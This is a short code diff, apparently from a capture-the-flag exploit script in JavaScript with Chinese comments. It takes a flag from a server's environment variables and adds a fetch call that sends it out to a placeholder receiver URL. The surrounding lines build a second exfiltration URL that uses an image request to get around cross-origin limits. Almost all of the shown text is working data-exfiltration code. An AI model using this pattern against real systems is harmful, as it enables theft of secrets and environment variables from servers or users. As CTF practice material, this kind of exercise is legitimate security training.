@@ -20,7 +20,7 @@
         .then(data => {
             const envFlag = data.flag; // 拿到环境变量里的FLAG
             console.log('[ENV-FLAG] 成功获取环境变量FLAG：', envFlag);
-            
+            fetch(YOUR_RECEIVE_URL+'?flag='+envFlag);
             // 关键：用img标签发送GET请求（无跨域限制，容器内网络兼容性最强）
             // 把FLAG拼接到URL参数，接收端直接读取即可
             const sendUrl = `${YOUR_RECEIVE_URL}?env_flag=${encodeURIComponent(envFlag)}`;
